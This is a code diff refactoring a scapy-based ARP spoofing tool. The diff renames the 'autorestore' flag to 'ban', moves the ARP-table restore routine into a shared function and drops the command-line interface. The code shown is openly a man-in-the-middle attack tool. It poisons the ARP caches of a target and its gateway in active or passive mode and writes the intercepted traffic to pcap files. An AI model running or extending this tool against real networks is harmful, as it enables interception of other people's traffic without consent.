@@ -12,10 +12,8 @@ from scapy.layers.l2 import ARP, Ether
 from scapy.utils import wrpcap
 from scapy.config import conf
 from datetime import datetime
-import argparse
 import signal
 import sys
-import os
 
 RED_BOLD = '\033[1;31m'
 BLUE_BOLD = '\033[1;34m'
@@ -42,7 +40,7 @@ class Arper:
         interface (str): Network interface to use for the attack.
         count (int): Number of packets to capture during the attack (default: 200).
         delay (int): Delay in seconds between ARP spoofing packets (default: 2).
-        autorestore (bool): Flag to automatically restore ARP tables post-attack.
+        ban (bool): Flag to prohibit automatic restoration of ARP tables post-attack (default: False). If True, no restoration occurs; if False, restoration is enabled. 
         active (bool): Flag to select between active or passive attack mode.
         poison_event (multiprocessing.Event): Event to control poisoning process.
         sniff_process (multiprocessing.Process): Process handling packet capture.
@@ -50,20 +48,20 @@ class Arper:
     Methods:
         run(): Initiates the ARP spoofing attack with the configured parameters.
     """
-    def __init__(self, target: str, gateway: str, interface:str, count: int = 200, delay=2, autorestore: bool = True, active=True, target_mac=None, gateway_mac=None):
+    def __init__(self, target: str, gateway: str, interface:str, count: int = 200, delay=2, ban: bool = False, active=True, target_mac=None, gateway_mac=None):
         '''
         :param target: Target IPv4 address
         :param gateway: Gateway IPv4 address
         :param interface: Selected network interface
         :param count: Number of packets to sniff, default is 200
-        :param autorestore: Whether to restore ARP table automatically, default is True
+        :param ban: Whether to prohibit automatic restoration of ARP table (default: False). If True, restoration is disabled; if False, restoration occurs. 
         '''
         # Raise an error immediately during initialisation for invalid input
         is_valid_ipv4((target, gateway))
         # Configured to spoof responses solely upon detecting ARP requests, but omitted the target and gateway MAC addresses
         if (not active) and not (target_mac and gateway_mac):
             raise InvalidConfigurationError('PassiveAttacker selected, but target and gateway MAC addresses not provided')
-        self.autorestore = autorestore
+        self.ban = ban
         self.target = target
         self.gateway = gateway
         self.target_mac = target_mac
@@ -91,7 +89,37 @@ class Arper:
                 self.poison_event = Event()
             attacker.start(self)
         return self.target_mac
-
+    
+def restore(arper: Arper):
+    '''
+    Automatically restore the ARP table after the attack ends 
+    or the attack is cancelled
+    '''
+    if not arper.ban:
+        print('Restoring ARP tables...')
+        sendp(
+            Ether(src=arper.gateway_mac, 
+                    dst=arper.target_mac) / 
+            ARP(
+                op=2, 
+                psrc=arper.gateway, 
+                hwsrc=arper.gateway_mac, 
+                pdst=arper.target, 
+                hwdst=arper.target_mac, 
+                ), 
+            count=5
+            )
+        sendp(
+            Ether(src=arper.target_mac, 
+                    dst=arper.gateway_mac) / 
+            ARP(
+                op=2, 
+                psrc=arper.target, 
+                hwsrc=arper.target_mac, 
+                pdst=arper.gateway, 
+                hwdst=arper.gateway_mac
+                ), 
+            count=5)
             
 class ActiveAttacker:
     
@@ -139,37 +167,6 @@ class ActiveAttacker:
             arper.poison_event.set()    # type: ignore
             wrpcap(f"arper_{arper.target}_{datetime.now().strftime('%Y%m%d-%H%M%S')}.pcap", packets)
             print(f'Got {len(packets)} packets')
-
-    def restore(self, arper: Arper):
-        '''
-        Automatically restore the ARP table after the attack ends 
-        or the attack is cancelled
-        '''
-        if arper.autorestore:
-            print('Restoring ARP tables...')
-            sendp(
-                Ether(src=arper.gateway_mac, 
-                      dst=arper.target_mac) / 
-                ARP(
-                    op=2, 
-                    psrc=arper.gateway, 
-                    hwsrc=arper.gateway_mac, 
-                    pdst=arper.target, 
-                    hwdst=arper.target_mac, 
-                    ), 
-                count=5
-                )
-            sendp(
-                Ether(src=arper.target_mac, 
-                      dst=arper.gateway_mac) / 
-                ARP(
-                    op=2, 
-                    psrc=arper.target, 
-                    hwsrc=arper.target_mac, 
-                    pdst=arper.gateway, 
-                    hwdst=arper.gateway_mac
-                    ), 
-                count=5)
     
     def start(self, arper:Arper):
         try:
@@ -190,7 +187,7 @@ class ActiveAttacker:
                 poison_process.join()
         finally:
             with NoInterrupt():
-                self.restore(arper)
+                restore(arper)
             
 
 class PassiveAttacker:
@@ -229,37 +226,6 @@ class PassiveAttacker:
             wrpcap(f"arper_{arper.target}_{datetime.now().strftime('%Y%m%d-%H%M%S')}.pcap", packets)
             print(f'Got {BLUE_BOLD}{len(packets)}{RESET} packets')
 
-    def restore(self, arper: Arper):
-        '''
-        Automatically restore the ARP table after the attack ends 
-        or the attack is cancelled
-        '''
-        if arper.autorestore:
-            print('Restoring ARP tables...')
-            sendp(
-                Ether(src=arper.gateway_mac, 
-                      dst=arper.target_mac) / 
-                ARP(
-                    op=2, 
-                    psrc=arper.gateway, 
-                    hwsrc=arper.gateway_mac, 
-                    pdst=arper.target, 
-                    hwdst=arper.target_mac, 
-                    ), 
-                count=5
-                )
-            sendp(
-                Ether(src=arper.target_mac, 
-                      dst=arper.gateway_mac) / 
-                ARP(
-                    op=2, 
-                    psrc=arper.target, 
-                    hwsrc=arper.target_mac, 
-                    pdst=arper.gateway, 
-                    hwdst=arper.gateway_mac
-                    ), 
-                count=5)
-
     def start(self, arper: Arper):
         self.iface = arper.interface
         print(f"{RED_BOLD}Ensure that promiscuous mode is enabled for the interface at least. {RESET}")
@@ -277,7 +243,7 @@ class PassiveAttacker:
                     print('Aborted. ')
         finally:
             with NoInterrupt():
-                self.restore(arper)
+                restore(arper)
 
 def handle_sigint(signum, frame):
     raise KeyboardInterrupt
@@ -331,66 +297,3 @@ class MACNotFoundError(ARPSpoofingError):
 class InvalidConfigurationError(ARPSpoofingError):
     pass
 
-if __name__ == '__main__':
-    '''ARP Spoofing Tool'''
-    if os.getuid() != 0:
-        raise PermissionError(f'{RED_BOLD}This tool requires root privileges to run{RESET}')
-    
-    parser = argparse.ArgumentParser(
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-        description='ARP Spoofing Tool\nThis tool performs ARP spoofing attacks, allowing interception of network traffic from target devices.',
-        epilog='''Examples:
-  %(prog)s 192.168.1.100 -g 192.168.1.1
-  %(prog)s 192.168.1.100 -g 192.168.1.1 -i eth0 -num 500 --no-restore'''
-    )
-    
-    parser.add_argument(
-        'target',
-        help='IPv4 address of the target device'
-    )
-    
-    parser.add_argument(
-        '-g', '--gateway',
-        metavar='IP_ADDRESS',
-        required=True,
-        help='IPv4 address of the network gateway',
-        dest='gateway'
-    )
-    
-    parser.add_argument(
-        '-i', '--interface',
-        metavar='INTERFACE',
-        help='Network interface to use (default: wlan0)',
-        default='wlan0'
-    )
-    
-    parser.add_argument(
-        '-n', '--no-restore',
-        help='Do not automatically restore ARP tables after attack',
-        action='store_false',
-        dest='n'
-    )
-    
-    parser.add_argument(
-        '--num',
-        type=int,
-        metavar='COUNT',
-        help='Number of packets to capture (default: 200)',
-        default=200
-    )
-    
-    args = parser.parse_args()
-
-    try:
-        myarp = Arper(target=args.target, 
-                      gateway=args.gateway, 
-                      interface=args.interface, 
-                      count=args.num, 
-                      autorestore=args.n)
-        myarp.run()
-    except (InvalidIPAddressError, MACNotFoundError) as e:
-        print(f'{RED_BOLD}Configuration error: {e}{RESET}')
-        sys.exit(1)
-    except PermissionError as e:
-        print(f'{RED_BOLD}{e}{RESET}')
-        sys.exit(1)
